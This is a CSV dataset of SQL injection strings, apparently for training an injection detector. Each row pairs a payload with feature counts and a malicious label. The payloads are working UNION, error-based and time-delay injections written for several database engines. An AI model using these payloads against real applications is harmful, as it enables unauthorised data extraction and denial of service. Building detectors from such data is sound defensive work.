Query,Singlequotes,Doublequotes,Punctuations,1-linecmt,Mulline-cmt,Spaces,Safekywrd,Harmflkywrd,Percentages,Log_oprtr,Operator,Nulls,Hex-dec,Db_info,Roles,Ntwr_cmds,Lang_cmds,Alphabets,Digits,Spl_char,Label
"1'   )    )     )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  'ibav'  =  'ibav",4,0,20,0,0,37,3,7,0,4,7,0,0,0,7,0,1,120,12,4,1
"1  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  ",0,0,9,0,0,19,7,0,0,6,8,0,0,0,5,0,1,62,10,0,1
"1',  (  select   (  case when   (  5217  =  5217  )   then 1 else 5217*  (  select 5217 from mysql.db  )   end   )    )   ",1,0,11,0,0,24,2,1,0,0,2,0,0,0,0,0,2,42,18,1,1
-7277   )    )     )   order by 1#,0,0,4,0,0,7,2,0,0,1,2,0,0,0,0,0,0,7,5,0,1
select   (  case when   (  7978  =  6009  )   then 7978 else 1/  (  select 0  )   end  )  --,0,0,8,0,0,20,2,1,0,0,4,0,0,0,0,0,2,31,14,0,1
"1'   )    )     )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  'bfrq' like 'bfrq",4,0,17,0,0,31,4,4,0,4,6,0,0,0,0,0,1,86,9,4,1
"-8143 union all select 4492,4492,4492,4492,4492,4492,4492,4492,4492#",0,0,9,0,0,5,4,0,0,1,2,0,0,0,0,0,1,14,40,0,1
"1  )   union all select null,null,null,null--",0,0,6,0,0,6,4,0,0,1,3,4,0,0,0,0,1,30,1,0,1
"-3438""  )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""nxiv""  =  ""nxiv",0,4,42,0,0,81,5,14,0,4,18,0,0,0,0,0,2,102,50,4,1
"1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",0,0,18,0,0,31,4,1,0,2,4,0,3,0,0,0,3,44,32,0,1
-5217 where 3620  =  3620 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,0,0,37,0,0,77,2,3,0,1,27,0,0,0,0,0,1,79,56,0,1
1%' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1,0,9,0,0,18,3,1,1,1,3,0,0,0,0,1,2,30,2,1,1
"-7255' union all select 2127,2127,2127,2127,2127#",1,0,6,0,0,5,4,0,0,1,2,0,0,0,0,0,1,14,24,1,1
"1  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  8898  =  8898",0,0,14,0,0,30,2,0,0,3,11,0,0,0,0,0,0,39,24,0,1
1  )   where 5866  =  5866 and 4595  =  4595#,0,0,1,0,0,10,1,0,0,2,4,0,0,0,0,0,0,8,17,0,1
"1' and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'rpiz' like 'rpiz",6,0,15,0,0,21,5,1,0,8,10,0,0,0,0,0,0,47,15,6,1
"1   )    )    as nlzg where 1482  =  1482 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",0,0,21,0,0,40,1,3,0,0,4,0,3,0,0,0,1,77,45,0,1
"1  )   where 5309  =  5309 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",0,0,10,0,0,27,2,4,0,1,6,0,0,0,0,0,1,76,17,0,1
"1%'   )    )     )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1,0,18,0,0,28,1,0,1,1,11,0,0,0,0,0,0,36,16,1,1
0x770061006900740066006F0072002000640065006C00 ...,0,0,4,0,0,2,0,0,0,0,0,0,1,0,0,0,0,3,43,0,1
"1""   )    )    and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",0,1,17,0,0,27,1,0,0,2,11,0,0,0,0,0,0,37,15,1,1
1%'   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1,0,12,0,0,21,3,1,1,2,4,0,0,0,0,1,2,28,2,1,1
"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 8  )   waitfor delay '0:0:2' --",2,0,15,0,0,19,3,2,0,3,8,0,0,1,0,1,1,39,7,2,1
"1   )    )    as sxhg where 7697  =  7697 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",0,0,30,0,0,56,2,8,0,2,16,2,0,0,0,0,0,82,37,0,1
"-2745' or elt  (  1032  =  1032,3623  )  ",1,0,5,0,0,8,1,0,0,1,3,0,0,0,0,0,0,5,16,1,1
"-1170' union all select 4663,4663,4663,4663,4663,4663,4663,4663#",1,0,9,0,0,5,4,0,0,1,2,0,0,0,0,0,1,14,36,1,1
-8023' or 6872  =  6872,1,0,2,0,0,5,1,0,0,1,3,0,0,0,0,0,0,2,12,1,1
"-7422"" union all select 9127,9127,9127,9127,9127,9127,9127,9127,9127,9127#",0,1,11,0,0,5,4,0,0,1,2,0,0,0,0,0,1,14,44,1,1
"-6611%""   )    )     )   union all select 8918,8918#",0,1,6,0,0,8,4,0,1,1,3,0,0,0,0,0,1,14,12,1,1
1' and sleep  (  5  ) ,1,0,3,0,0,6,1,1,0,2,2,0,0,0,0,1,0,8,2,1,1
"-2745'  )   or elt  (  1032  =  1032,3623  )   and   (  'vfxq'  =  'vfxq",4,0,10,0,0,14,2,0,0,3,6,0,0,0,0,0,0,16,16,4,1
1'   )    )     )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (     (  'qrtf'  =  'qrtf,4,0,14,0,0,23,3,1,0,4,6,0,0,0,0,1,1,31,10,4,1
1'   )    )    and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'mmow'  =  'mmow,4,0,42,0,0,80,4,13,0,5,17,0,0,0,0,0,1,89,47,4,1
-2495   )    )    as hudw where 4197  =  4197 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --,0,0,36,0,0,78,2,3,0,1,27,0,0,0,0,0,1,101,56,0,1
"-2122""  )   as zytb where 7025  =  7025 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",0,1,36,0,0,77,2,3,0,1,27,0,0,0,0,0,1,101,56,1,1
1%' or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and '%'  =  ',4,0,8,0,0,17,3,1,2,3,7,0,0,0,0,1,1,22,10,4,1
"-2912""  )   as eizh where 2223  =  2223 or make_set  (  1041  =  3056,3056  )  --",0,1,8,0,0,16,3,1,0,1,6,0,0,0,0,0,0,20,24,1,1
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  ""%""  =  """,2,3,17,0,0,21,4,1,1,5,8,0,0,0,0,0,1,38,10,5,1
"1"" and elt  (  1210  =  1210,sleep  (  5   )    )    and ""zhxm""  =  ""zhxm",0,4,9,0,0,15,2,1,0,4,6,0,0,0,0,1,0,22,10,4,1
"1%""   )    )    and 6283  =  2068 and    (    (   ""%""  =  """,0,4,8,0,0,13,2,0,2,4,8,0,0,0,0,0,0,6,9,4,1
-2951 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  # gwqv,0,0,39,0,0,89,3,1,0,1,30,0,0,0,0,0,2,104,54,0,1
"1""   )    )    rlike   (  select   (  case when   (  5342  =  1036  )   then 1 else 0x28 end   )    )    and    (    (   ""ntdz"" like ""ntdz",0,4,14,0,0,27,4,1,0,4,5,0,1,0,0,0,1,46,13,4,1
1'   )    )    and 7230  =  2517,1,0,3,0,0,7,1,0,0,2,3,0,0,0,0,0,0,3,9,1,1
"1""   )    )    waitfor delay '0:0:5'--",2,1,9,0,0,6,1,1,0,1,3,0,0,0,0,1,0,12,4,3,1
select   (  case when   (  2394  =  4530  )   then 2394 else 2394*  (  select 2394 from information_schema.character_sets  )   end  )  #,0,0,7,0,0,22,7,2,0,2,4,0,0,0,0,0,2,65,20,0,1
"1'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'kzgt'  =  'kzgt",4,0,11,0,0,16,4,0,0,4,6,0,0,0,0,0,0,21,13,4,1
"-4635"" union all select 5087,5087,5087,5087,5087,5087,5087,5087,5087,5087#",0,1,11,0,0,5,4,0,0,1,2,0,0,0,0,0,1,14,44,1,1
1'   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1,0,12,0,0,21,3,1,0,1,2,0,0,0,0,1,2,30,2,1,1
"1   )    )    as potk where 5040  =  5040 or elt  (  5873  =  5873,sleep  (  5   )    )   #",0,0,7,0,0,20,1,2,0,1,3,0,0,0,0,1,0,21,18,0,1
"1'  )   as lrif where 6525  =  6525 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",1,0,30,0,0,64,16,2,0,4,11,0,2,0,0,0,6,109,63,1,1
"-4588"" union all select 4550,4550,4550,4550#",0,1,5,0,0,5,4,0,0,1,2,0,0,0,0,0,1,14,20,1,1
" select * from users where id  =  1 union select @<@.,version  (    )   -- 1",0,0,6,1,0,15,4,1,0,0,5,0,0,0,1,0,2,40,2,0,1
-6397%' or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and '%'  =  ',4,0,34,0,0,71,4,1,2,4,30,0,0,0,0,0,1,91,48,4,1
1 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  -- izad,4,0,10,1,0,24,3,2,0,2,9,0,0,0,0,0,1,57,15,4,1
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual",0,0,12,0,0,23,1,0,0,0,6,0,0,0,0,0,1,48,10,0,1
"1'   )    )    and make_set  (  8403  =  8403,8899  )   and    (    (   'bmsa'  =  'bmsa",4,0,11,0,0,16,4,0,0,4,6,0,0,0,0,0,0,21,13,4,1
"1""  )   as kfvy where 7305  =  7305 or sleep  (  5  )  --",0,1,6,0,0,14,1,2,0,1,4,0,0,0,0,1,0,18,10,1,1
"1""  )   as sstd where 9629  =  9629 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --",0,1,20,0,0,30,3,2,0,1,5,0,3,0,0,0,2,44,47,1,1
"-3853""  )   where 4626  =  4626 union all select 4626,4626,4626--",0,1,7,0,0,10,4,0,0,1,5,0,0,0,0,0,1,19,24,1,1
begin if   (  5624  =  5624  )   then dbms_lock.sleep  (  5  ) ,0,0,5,0,0,12,1,1,0,1,2,0,0,0,0,1,1,24,9,0,1
"1'   )    )     )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (     (  'vfnl'  =  'vfnl",4,0,26,0,0,32,4,1,0,4,6,0,3,0,0,0,2,45,39,4,1
1' order by 1#,1,0,1,0,0,4,2,0,0,1,1,0,0,0,0,0,0,7,2,1,1
"1""  )   where 3404  =  3404 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",2,1,15,0,0,23,3,1,0,5,10,0,0,0,0,0,0,37,23,3,1
"1%""   )    )    or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   ""%""  =  """,0,4,27,0,0,43,3,5,2,4,14,1,0,0,0,0,0,55,24,4,1
"1 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ",0,0,9,0,0,19,2,3,0,2,4,0,0,0,0,0,1,72,8,0,1
"-7876%'  )   union all select 3909,3909,3909,3909,3909#",1,0,7,0,0,6,4,0,1,1,3,0,0,0,0,0,1,14,24,1,1
"1  )   where 8630  =  8630 union all select null,null--",0,0,4,0,0,10,4,0,0,1,4,2,0,0,0,0,1,27,9,0,1
"1  )   union all select null,null,null,null,null--",0,0,7,0,0,6,4,0,0,1,3,5,0,0,0,0,1,34,1,0,1
"1'+  (  select lhho where 7579  =  7579 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1,0,23,0,0,43,3,5,0,3,14,1,0,0,0,0,1,68,33,1,1
"-3250%"" union all select 7162,7162,7162,7162,7162,7162,7162,7162,7162--",0,1,12,0,0,5,4,0,1,1,5,0,0,0,0,0,1,14,40,1,1
"1'  )   union all select null,null,null,null,null,null,null#",1,0,8,0,0,6,4,0,0,1,1,7,0,0,0,0,1,42,1,1,1
-3125'   )    )     )   order by 1#,1,0,5,0,0,7,2,0,0,1,2,0,0,0,0,0,0,7,5,1,1
"1""   )    )     )   union all select null,null,null,null#",0,1,7,0,0,8,4,0,0,1,1,4,0,0,0,0,1,30,1,1,1
"1   )    )     (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and    (    (   3366  =  3366",0,0,30,0,0,58,6,7,0,5,13,1,0,0,1,0,1,110,42,0,1
"-2896'   )    )    as wisk where 1030  =  1030 union all select 1030,1030,1030,1030#",1,0,7,0,0,13,4,1,0,1,3,0,0,0,0,0,1,25,28,1,1
"1' or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  ",1,0,11,0,0,27,2,7,0,1,3,0,0,0,7,0,1,108,12,1,1
1 where 3802  =  3802 and 2006  =  2006,0,0,0,0,0,9,1,0,0,2,4,0,0,0,0,0,0,8,17,0,1
"1""  )   as eoer where 8667  =  8667 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --",0,1,8,0,0,21,2,2,0,1,5,0,0,0,0,1,1,30,18,1,1
"-4919  )   union all select 2608,2608,2608,2608,2608,2608#",0,0,7,0,0,6,4,0,0,1,2,0,0,0,0,0,1,14,28,0,1
-5470'   )    )    or   (  8459  =  8459  )  *4906 and    (    (   'oeam'  =  'oeam,4,0,11,0,0,16,2,0,0,3,7,0,0,0,0,0,0,13,16,4,1
"-9934""  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  ""xecb"" like ""xecb",0,4,40,0,0,76,4,1,0,4,27,0,0,0,0,0,1,95,52,4,1
"-9698  )   as pvhn where 3223  =  3223 or elt  (  6563  =  9210,9210  )  --",0,0,7,0,0,16,1,1,0,1,6,0,0,0,0,0,0,16,24,0,1
"1"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  ",0,1,17,0,0,22,3,1,0,2,3,0,3,0,0,0,2,34,39,1,1
1  )   as mtnw where 7293  =  7293 and 2603  =  5764--,0,0,3,0,0,12,1,1,0,2,6,0,0,0,0,0,0,14,17,0,1
"select * from generate_series  (  3379,3379,case when   (  3379  =  1219  )   then 1 else 0 end  )   limit 1--",0,0,8,0,0,20,1,1,0,0,4,0,0,0,0,0,1,48,19,0,1
"1"" where 5406  =  5406 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --",0,1,18,0,0,26,2,1,0,2,6,0,3,0,0,0,1,42,43,1,1
1'+  (  select 'tjvt' where 2463  =  2463,3,0,4,0,0,8,1,0,0,0,2,0,0,0,0,0,1,15,9,3,1
select   (  case when   (  7852  =  7476  )   then 7852 else 7852*  (  select 7852 from mysql.db  )   end  )  #,0,0,7,0,0,22,2,1,0,0,2,0,0,0,0,0,2,42,20,0,1
1'  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  'zqiw'  =  'zqiw,4,0,14,0,0,23,4,1,0,3,5,0,0,0,0,1,2,41,2,4,1
"-5344"" union all select 9482,9482,9482,9482,9482,9482,9482,9482,9482--",0,1,12,0,0,5,4,0,0,1,4,0,0,0,0,0,1,14,40,1,1
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  'lijy'  =  'lijy",3,0,11,0,0,15,2,0,0,2,3,0,1,0,0,0,1,31,15,3,1
select * from users where id  =  1 <@.. or 1  =  1 -- 1,0,0,4,1,0,15,2,0,0,1,7,0,0,0,1,0,1,24,4,0,1
"-3316%"" or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and ""%""  =  """,0,4,39,0,0,76,3,3,2,3,29,0,0,0,0,0,1,77,48,4,1
select * from users where id  =  1 + $+%\ or 1  =  1 -- 1,0,0,2,1,0,16,2,0,1,1,9,0,0,0,1,0,1,24,4,1,1
1'  )   where 7903  =  7903,1,0,2,0,0,6,0,0,0,0,1,0,0,0,0,0,0,5,9,1,1
"-4798""   )    )     )   union all select 7892,7892,7892,7892,7892,7892,7892,7892,7892,7892#",0,1,14,0,0,8,4,0,0,1,2,0,0,0,0,0,1,14,44,1,1
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ""%""  =  """,0,3,10,0,0,17,2,3,1,2,5,0,0,0,0,0,1,72,3,3,1
"-9837"" where 7201  =  7201 union all select 7201,7201,7201--",0,1,6,0,0,9,4,0,0,1,5,0,0,0,0,0,1,19,24,1,1
"1'||  (  select 'iocs' where 9287  =  9287 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  ||'",4,0,13,0,0,25,3,0,0,2,9,0,0,0,0,0,2,47,21,4,1
-8163   )    )    as cvai where 2360  =  2360 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,0,0,39,0,0,81,2,4,0,1,27,0,0,0,0,0,1,85,56,0,1
"1%'  )   union all select null,null,null--",1,0,6,0,0,6,4,0,1,1,4,3,0,0,0,0,1,26,1,1,1
1'||  (  select 'vvpn' from dual where 7011  =  7011 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   ||',4,0,37,0,0,80,3,2,0,2,29,0,0,0,0,0,2,114,53,4,1
"1""  )   union all select null,null,null--",0,1,6,0,0,6,4,0,0,1,3,3,0,0,0,0,1,26,1,1,1
"1 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  ",0,0,7,0,0,21,2,4,0,2,4,0,0,0,0,0,1,72,9,0,1
"1'   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  'toft'  =  'toft",4,0,28,0,0,41,5,1,0,3,6,0,3,0,0,0,3,54,32,4,1
"select count  (  *  )   from generate_series  (  1,5000000  )   and ""ihbe"" like ""ihbe",0,3,8,0,0,14,3,0,0,3,4,0,0,0,0,0,1,44,8,3,1
"-9630%"" union all select 8592,8592,8592,8592--",0,1,7,0,0,5,4,0,1,1,5,0,0,0,0,0,1,14,20,1,1
1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  'dtzt' like 'dtzt,4,0,10,0,0,19,4,1,0,4,5,0,0,0,0,1,1,34,10,4,1
"-1487""  )   as crfi where 2407  =  2407 union all select 2407,2407,2407,2407,2407,2407,2407,2407,2407,2407--",0,1,14,0,0,12,4,1,0,1,5,0,0,0,0,0,1,25,52,1,1
"1""   )    )     )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",2,1,17,0,0,21,3,1,0,4,8,0,0,0,0,0,0,31,15,3,1
"1%'  )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,0,13,0,0,21,2,3,1,2,7,0,0,0,0,0,1,72,8,1,1
"1"" where 6501  =  6501",0,1,1,0,0,5,0,0,0,0,1,0,0,0,0,0,0,5,9,1,1
"1'  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  'ajkb'  =  'ajkb",4,0,14,0,0,24,8,0,0,9,12,0,0,0,5,0,1,74,10,4,1
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and ""rbqs""  =  ""rbqs",0,3,21,0,0,33,3,4,0,4,9,2,0,0,0,0,1,68,16,3,1
"1""  )   rlike sleep  (  5  )   and   (  ""rfsd""  =  ""rfsd",0,4,8,0,0,12,2,1,0,3,4,0,0,0,0,1,0,21,2,4,1
-7452 where 2224  =  2224 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --,0,0,34,0,0,74,2,2,0,1,27,0,0,0,0,0,1,95,56,0,1
"1'   )    )    union all select null,null,null,null,null,null,null--",1,0,11,0,0,7,4,0,0,1,3,7,0,0,0,0,1,42,1,1,1
1'+  (  select basp where 6953  =  6953,1,0,2,0,0,8,1,1,0,0,2,0,0,0,0,0,1,15,9,1,1
1%' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and '%'  =  ',4,0,8,0,0,17,3,1,2,4,8,0,0,0,0,1,1,23,10,4,1
"1  )   where 1880  =  1880 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",0,0,15,0,0,30,1,0,0,2,12,0,0,0,0,0,0,42,23,0,1
"1  )   as asmt where 4986  =  4986 union all select null,null#",0,0,2,0,0,12,4,2,0,1,2,2,0,0,0,0,1,33,9,0,1
"1'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  ",1,0,18,0,0,23,3,1,0,1,2,0,3,0,0,0,2,33,39,1,1
"select count  (  *  )   from generate_series  (  1,5000000  )  # fnck",0,0,5,0,0,12,1,0,0,0,1,0,0,0,0,0,1,33,8,0,1
"1"" or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  ",0,1,27,0,0,47,2,7,0,2,13,2,0,0,0,0,0,71,29,1,1
" select * from users where id  =  1 or 1#""@ union select null,version  (    )   -- 1",0,1,6,1,0,17,5,1,0,1,5,1,0,0,1,0,2,46,3,1,1
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  'dvpw'  =  'dvpw",3,0,9,0,0,13,2,0,0,2,3,0,1,0,0,0,1,31,15,3,1
"1""  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and   (  ""cadh"" like ""cadh",0,4,14,0,0,23,5,1,0,4,5,0,0,0,0,1,2,42,2,4,1
"-2009%' union all select 1991,1991#",1,0,3,0,0,5,4,0,1,1,3,0,0,0,0,0,1,14,12,1,1
